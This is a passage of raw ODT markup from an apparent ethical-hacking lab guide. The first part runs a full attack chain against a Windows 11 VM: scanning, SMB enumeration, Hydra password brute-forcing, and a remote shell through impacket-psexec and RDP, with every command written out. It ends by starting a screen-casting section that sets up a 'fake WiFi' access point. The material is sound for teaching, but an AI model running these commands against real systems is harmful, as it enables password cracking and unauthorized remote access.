              <text:p text:style-name="P88">Install VirtualBox on your host machine.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88">Create a <text:span text:style-name="T12">Kali Linux</text:span> VM and a <text:span text:style-name="T12">Windows 11</text:span> VM.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88">For the network, set both VMs to use <text:span text:style-name="T12">Host‑Only Adapter</text:span> (or <text:span text:style-name="T12">Internal Network</text:span>) to isolate them from the internet and your host.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88">Start both VMs and note their IP addresses (e.g., Kali: <text:span text:style-name="T13">192.168.56.101</text:span>, Windows: <text:span text:style-name="T13">192.168.56.102</text:span>).</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="T14">Tip: Use </text:span><text:span text:style-name="T16">ip a</text:span><text:span text:style-name="T14"> on Kali and </text:span><text:span text:style-name="T16">ipconfig</text:span><text:span text:style-name="T14"> on Windows to find IPs.</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P88"><text:span text:style-name="T12">Windows 11 Setup for Practice</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P88">Create a <text:span text:style-name="T12">non‑admin test user</text:span> with a weak password (e.g., <text:span text:style-name="T13">test:Password123</text:span>).</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88">Enable <text:span text:style-name="T12">Remote Desktop</text:span> (Settings → System → Remote Desktop → Enable).</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88">Ensure <text:span text:style-name="T12">File and Printer Sharing</text:span> is on (SMB).</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:soft-page-break/><text:span text:style-name="T14">For more realism, you can install a vulnerable application like </text:span><text:span text:style-name="T17">XAMPP</text:span><text:span text:style-name="T14"> or </text:span><text:span text:style-name="T17">FileZilla</text:span><text:span text:style-name="T14"> – but we'll focus on built‑in services.</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🔎 Step 1: Reconnaissance (Discovering Targets)</text:h>
      <text:p text:style-name="Text_20_body">From Kali, use <text:span text:style-name="T13">nmap</text:span> to scan the Windows 11 IP:</text:p>
      <text:p text:style-name="P44">nmap -sS -sV -O -p- 192.168.56.102</text:p>
      <text:list text:style-name="L40">
        <text:list-item>
          <text:p text:style-name="P89"><text:span text:style-name="T13">-sS</text:span> : SYN scan (fast)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P89"><text:span text:style-name="T13">-sV</text:span> : version detection</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P89"><text:span text:style-name="T13">-O</text:span> : OS detection</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P89"><text:span text:style-name="T13">-p-</text:span> : all 65535 ports</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Expected results:</text:span> You'll see open ports like:</text:p>
      <text:list text:style-name="L41">
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="T12">445/tcp</text:span> – SMB (file sharing)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="T12">3389/tcp</text:span> – RDP (Remote Desktop)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="T12">53/tcp</text:span> – DNS (if enabled)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="T12">80/tcp</text:span> – HTTP (if IIS installed)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">📡 Step 2: Service Enumeration</text:h>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">2.1 SMB Enumeration</text:h>
      <text:p text:style-name="Text_20_body">Use <text:span text:style-name="T13">enum4linux</text:span> to gather user accounts, shares, and policies:</text:p>
      <text:p text:style-name="P44">enum4linux -a 192.168.56.102</text:p>
      <text:list text:style-name="L42">
        <text:list-item>
          <text:p text:style-name="P91"><text:span text:style-name="T13">-a</text:span> : do all simple enumeration</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Alternatively, use <text:span text:style-name="T13">smbclient</text:span> to list shares:</text:p>
      <text:p text:style-name="P44">smbclient -L //192.168.56.102 -N</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Understanding:</text:span> This reveals shared folders, some may be writable or contain sensitive files.</text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">2.2 RDP Information</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T13">nmap</text:span> already showed RDP (3389). Use <text:span text:style-name="T13">nmap</text:span> scripts to get more info:</text:p>
      <text:p text:style-name="P44">nmap --script rdp-ntlm-info -p 3389 192.168.56.102</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>🔓 Step 3: Password Attacks</text:h>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">3.1 Brute‑Force SMB with Hydra</text:h>
      <text:p text:style-name="Text_20_body">We'll attempt to guess the password for the <text:span text:style-name="T13">test</text:span> user.</text:p>
      <text:p text:style-name="P44">hydra -l test -P /usr/share/wordlists/rockyou.txt smb://192.168.56.102</text:p>
      <text:list text:style-name="L43">
        <text:list-item>
          <text:p text:style-name="P92"><text:span text:style-name="T13">-l</text:span> : single username</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P92"><text:span text:style-name="T13">-P</text:span> : password list (use a small list for speed; <text:span text:style-name="T13">rockyou.txt</text:span> is huge – you can use a smaller custom list)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Understanding:</text:span> Hydra tries each password until one works. This is a brute‑force attack. In a real environment, account lockouts would hinder this.</text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">3.2 Brute‑Force RDP with Hydra</text:h>
      <text:p text:style-name="P44">hydra -l test -P /usr/share/wordlists/rockyou.txt rdp://192.168.56.102</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🚀 Step 4: Exploitation</text:h>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">4.1 Using SMB with Credentials</text:h>
      <text:p text:style-name="Text_20_body">Once you have valid credentials (e.g., <text:span text:style-name="T13">test:Password123</text:span>), you can connect to SMB shares:</text:p>
      <text:p text:style-name="P44">smbclient //192.168.56.102/C$ -U test</text:p>
      <text:p text:style-name="Text_20_body">If you get access, you can upload/download files. To gain a shell, use <text:span text:style-name="T12">psexec</text:span> (from <text:span text:style-name="T13">impacket</text:span> tools) to execute commands remotely:</text:p>
      <text:p text:style-name="P44">impacket-psexec test:Password123@192.168.56.102</text:p>
      <text:p text:style-name="Text_20_body">This gives a command shell on Windows!</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Understanding:</text:span> <text:span text:style-name="T13">psexec</text:span> uses SMB to upload a service and run commands, effectively giving you system‑level access.</text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">4.2 RDP Access</text:h>
      <text:p text:style-name="Text_20_body">With the same credentials, use <text:span text:style-name="T13">xfreerdp</text:span> to get a GUI session:</text:p>
      <text:p text:style-name="P44">xfreerdp /v:192.168.56.102 /u:test /p:Password123</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🛡️ Step 5: Post‑Exploitation &amp; Cleanup</text:h>
      <text:p text:style-name="Text_20_body">After your test, remember to:</text:p>
      <text:list text:style-name="L44">
        <text:list-item>
          <text:p text:style-name="P93">Disable the test user or change its password.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P93"><text:soft-page-break/>Turn off Remote Desktop if not needed.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P93">Review Windows logs to see the attack traces.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🧠 Understanding the Attack Chain</text:h>
      <table:table table:name="Table9" table:style-name="Table9">
        <table:table-column table:style-name="Table9.A" table:number-columns-repeated="3"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table9.A1" office:value-type="string">
              <text:p text:style-name="P82">Phase</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table9.A1" office:value-type="string">
              <text:p text:style-name="P82">Tool/Method</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table9.C1" office:value-type="string">
              <text:p text:style-name="P82">What Happens</text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Recon</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">nmap</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.C2" office:value-type="string">
            <text:p text:style-name="P62">Discover open ports and services.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Enumeration</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">enum4linux</text:span>, <text:span text:style-name="T13">smbclient</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.C2" office:value-type="string">
            <text:p text:style-name="P62">Gather usernames, shares, and policies.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Credential Attack</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">hydra</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.C2" office:value-type="string">
            <text:p text:style-name="P62">Brute‑force weak password for a user.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Exploitation</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">impacket-psexec</text:span>, <text:span text:style-name="T13">xfreerdp</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.C2" office:value-type="string">
            <text:p text:style-name="P62">Gain remote command or GUI access.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Persistence</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.A2" office:value-type="string">
            <text:p text:style-name="P62">(optional)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.C2" office:value-type="string">
            <text:p text:style-name="P62">Create backdoor accounts or scheduled tasks.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Why this works:</text:span> Many systems have weak passwords or misconfigured services. This lab demonstrates that a single weak credential can lead to full system compromise.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔧 All Tools &amp; Commands Summary</text:h>
      <table:table table:name="Table10" table:style-name="Table10">
        <table:table-column table:style-name="Table10.A" table:number-columns-repeated="3"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table10.A1" office:value-type="string">
              <text:p text:style-name="P82">Tool</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table10.A1" office:value-type="string">
              <text:p text:style-name="P82">Command</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table10.C1" office:value-type="string">
              <text:p text:style-name="P82">Purpose</text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Gobuster</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">gobuster dir -u http://... -w wordlist.txt</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">Directory brute‑force</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Gobuster</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">gobuster dns -d domain -w wordlist.txt</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">Subdomain discovery</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Gobuster</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">gobuster vhost -u http://... -w wordlist.txt --domain domain</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">Virtual host discovery</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Nmap</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">nmap -sS -sV -O -p- target</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">Port/OS/service scan</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Nmap</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">nmap --script rdp-ntlm-info -p 3389 target</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">RDP information gathering</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">enum4linux</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">enum4linux -a target</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">SMB enumeration</text:p>
          </table:table-cell>
        </table:table-row>
        <text:soft-page-break/>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">smbclient</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">smbclient -L //target -N</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">List SMB shares</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Hydra</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">hydra -l user -P wordlist.txt smb://target</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">SMB brute‑force</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Hydra</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">hydra -l user -P wordlist.txt rdp://target</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">RDP brute‑force</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">impacket-psexec</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">impacket-psexec user:pass@target</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">Execute commands via SMB</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">xfreerdp</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">xfreerdp /v:target /u:user /p:pass</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.C2" office:value-type="string">
            <text:p text:style-name="P62">RDP GUI session</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">✅ Final Practice Checklist</text:h>
      <text:list text:style-name="L45">
        <text:list-item>
          <text:p text:style-name="P94"><loext:content-control loext:checkbox="true" loext:checked-state="☒" loext:unchecked-state="☐" loext:id="1655447622">☐</loext:content-control> Run Gobuster against a local web server.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><loext:content-control loext:checkbox="true" loext:checked-state="☒" loext:unchecked-state="☐" loext:id="1764229554">☐</loext:content-control> Discover at least 3 hidden directories.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><loext:content-control loext:checkbox="true" loext:checked-state="☒" loext:unchecked-state="☐" loext:id="1465508822">☐</loext:content-control> Enumerate SMB shares on your Windows 11 VM.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><loext:content-control loext:checkbox="true" loext:checked-state="☒" loext:unchecked-state="☐" loext:id="1228141305">☐</loext:content-control> Use Hydra to crack the <text:span text:style-name="T13">test</text:span> user password (with a small wordlist).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><loext:content-control loext:checkbox="true" loext:checked-state="☒" loext:unchecked-state="☐" loext:id="895528591">☐</loext:content-control> Connect to SMB with the cracked password using <text:span text:style-name="T13">smbclient</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><loext:content-control loext:checkbox="true" loext:checked-state="☒" loext:unchecked-state="☐" loext:id="1003110895">☐</loext:content-control> Use <text:span text:style-name="T13">impacket-psexec</text:span> to get a shell.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><loext:content-control loext:checkbox="true" loext:checked-state="☒" loext:unchecked-state="☐" loext:id="1381171604">☐</loext:content-control> Log in via RDP.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Remember:</text:span> These techniques are only for learning on your own lab. Never use them on systems you don't own. Understanding attacks is the first step to building robust defenses. If you want to go further, explore <text:span text:style-name="T12">Windows hardening</text:span>, <text:span text:style-name="T12">deploying MFA</text:span>, and <text:span text:style-name="T12">setting up proper logging</text:span>.</text:p>
      <text:p text:style-name="Text_20_body">Happy (ethical) hacking! 🖥️🔐</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P95">CASTING / MIRRORING A DEVICE (MONITOR) USING KALI LINUX</text:p>
      <text:p text:style-name="P44"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:soft-page-break/><text:span text:style-name="T12">⚠️ LEGAL &amp; ETHICAL DISCLAIMER</text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">ONLY perform screen casting to devices YOU OWN or have EXPLICIT PERMISSION to access. Unauthorized casting to others' devices is ILLEGAL and violates privacy laws. This guide is for educational purposes on your own lab equipment.</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">MONITOR CASTING FROM KALI TO CONNECTED DEVICES</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">OVERVIEW OF METHODS</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="T12">Method 1: Miracast/Wi-Fi Direct (For compatible devices)</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="T12">Method 2: Chromecast/Google Cast Protocol</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="T12">Method 3: DLNA/UPnP Media Streaming</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="T12">Method 4: VNC/RDP Remote Desktop</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="T12">Method 5: Web-based Casting</text:span></text:h>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">PREREQUISITES</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">1. Network Setup Verification</text:span></text:h>
      <text:p text:style-name="P44"># Ensure your fake WiFi is running<text:line-break/>sudo create_ap wlan0 eth0 Kali_Lab password123<text:line-break/><text:line-break/># Check connected clients<text:line-break/>sudo arp-scan --interface=wlan0 --localnet<text:line-break/># or<text:line-break/>ip neigh show<text:line-break/><text:line-break/># Verify your IP<text:line-break/>ifconfig wlan0<text:line-break/># Should show: 192.168.1.1 (gateway)</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">2. Install Required Tools</text:span></text:h>
      <text:p text:style-name="P44"># Update system<text:line-break/>sudo apt update<text:line-break/><text:line-break/># Install casting/streaming tools<text:line-break/>sudo apt install -y \<text:line-break/> <text:s text:c="3"/>gstreamer1.0-tools \<text:line-break/><text:soft-page-break/> <text:s text:c="3"/>gstreamer1.0-plugins-good \<text:line-break/> <text:s text:c="3"/>gstreamer1.0-plugins-bad \<text:line-break/> <text:s text:c="3"/>gstreamer1.0-plugins-ugly \<text:line-break/> <text:s text:c="3"/>gstreamer1.0-libav \<text:line-break/> <text:s text:c="3"/>vlc \<text:line-break/> <text:s text:c="3"/>ffmpeg \<text:line-break/> <text:s text:c="3"/>netcat \<text:line-break/> <text:s text:c="3"/>nginx \<text:line-break/> <text:s text:c="3"/>nodejs \<text:line-break/> <text:s text:c="3"/>npm \<text:line-break/> <text:s text:c="3"/>x11vnc \<text:line-break/> <text:s text:c="3"/>tightvncserver \<text:line-break/> <text:s text:c="3"/>pulseaudio \<text:line-break/> <text:s text:c="3"/>pavucontrol</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">METHOD 1: MIRACAST/WI-FI DIRECT</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 1: Check Miracast Support</text:span></text:h>
      <text:p text:style-name="P44"># Check if your WiFi adapter supports P2P/Wi-Fi Direct<text:line-break/>iw list | grep -A 10 "Supported interface modes"<text:line-break/># Look for "P2P-client" or "P2P-GO"<text:line-break/><text:line-break/># Check wpa_supplicant version<text:line-break/>wpa_supplicant -v<text:line-break/><text:line-break/># Install wpa_supplicant with P2P support<text:line-break/>sudo apt install wpasupplicant</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 2: Start Wi-Fi Direct</text:span></text:h>
      <text:p text:style-name="P44"># Stop NetworkManager interference<text:line-break/>sudo systemctl stop NetworkManager<text:line-break/><text:line-break/># Start wpa_supplicant in P2P mode<text:line-break/>sudo wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf -D nl80211 -B<text:line-break/><text:line-break/># Enter wpa_cli interactive mode<text:line-break/>sudo wpa_cli -i wlan0<text:line-break/><text:line-break/># In wpa_cli:<text:line-break/>&gt; p2p_find<text:line-break/>&gt; p2p_peers <text:s/># List found devices<text:line-break/>&gt; p2p_connect [PEER_MAC] pbc <text:s/># Connect via WPS<text:line-break/>&gt; p2p_group_add <text:s/># Create group owner</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 3: Stream Display via Miracast</text:span></text:h>
      <text:p text:style-name="P44"># Using wfd-sink (Wi-Fi Display sink)<text:line-break/>git clone https://github.com/01org/wds<text:line-break/>cd wds<text:line-break/><text:soft-page-break/>mkdir build &amp;&amp; cd build<text:line-break/>cmake ..<text:line-break/>make<text:line-break/>sudo make install<text:line-break/><text:line-break/># Start wfd-sink (receiver on target device)<text:line-break/># On TARGET device (if you control it):<text:line-break/>wfd-sink --ip=192.168.1.100 --port=7236<text:line-break/><text:line-break/># On KALI (source):<text:line-break/># Capture screen and stream<text:line-break/>ffmpeg -f x11grab -r 25 -s 1920x1080 -i :0.0 -vcodec libx264 \<text:line-break/> <text:s text:c="3"/>-preset ultrafast -tune zerolatency -f mpegts udp://192.168.1.100:1234</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">How it works</text:span>: Miracast uses Wi-Fi Direct to establish peer-to-peer connection, then streams H.264 encoded video over RTP/UDP.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">METHOD 2: CHROMECAST PROTOCOL EMULATION</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 1: Set Up Cast Server</text:span></text:h>
      <text:p text:style-name="P44"># Install Node.js cast server<text:line-break/>npm install -g nodecastor-js<text:line-break/><text:line-break/># Or install Python cast server<text:line-break/>sudo apt install python3-pip<text:line-break/>pip3 install pychromecast<text:line-break/><text:line-break/># Create simple HTTP server for media<text:line-break/>mkdir ~/cast_media<text:line-break/>cd ~/cast_media<text:line-break/>python3 -m http.server 8000 &amp;</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 2: Discover Cast Devices</text:span></text:h>
      <text:p text:style-name="P44"># Using pychromecast to discover<text:line-break/>python3 -c "<text:line-break/>import pychromecast<text:line-break/>chromecasts = pychromecast.get_chromecasts()<text:line-break/>print([cc.device.friendly_name for cc in chromecasts])<text:line-break/>"<text:line-break/><text:line-break/># Manual discovery via mDNS<text:line-break/>avahi-browse -rt _googlecast._tcp<text:line-break/># Should show devices on your network</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 3: Cast Screen to Device</text:span></text:h>
      <text:p text:style-name="P44"># Method A: Using ffmpeg to stream<text:line-break/>ffmpeg -f x11grab -framerate 30 -video_size 1920x1080 \<text:line-break/> <text:s text:c="3"/>-i :0.0 -f mp4 -vcodec libx264 -preset ultrafast \<text:line-break/> <text:s text:c="3"/>http://192.168.1.100:8000/screen.mp4<text:line-break/><text:soft-page-break/><text:line-break/># Method B: Using cast-tool<text:line-break/>cast-tool --host 192.168.1.100 --port 8009 \<text:line-break/> <text:s text:c="3"/>--media http://192.168.1.1:8000/screen.mp4</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">How it works</text:span>: Chromecast uses mDNS for discovery and HTTP/HTTPS for media streaming with adaptive bitrate.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">METHOD 3: DLNA/UPNP MEDIA SERVER</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 1: Set Up DLNA Server</text:span></text:h>
      <text:p text:style-name="P44"># Install minidlna<text:line-break/>sudo apt install minidlna<text:line-break/><text:line-break/># Configure minidlna<text:line-break/>sudo nano /etc/minidlna.conf</text:p>
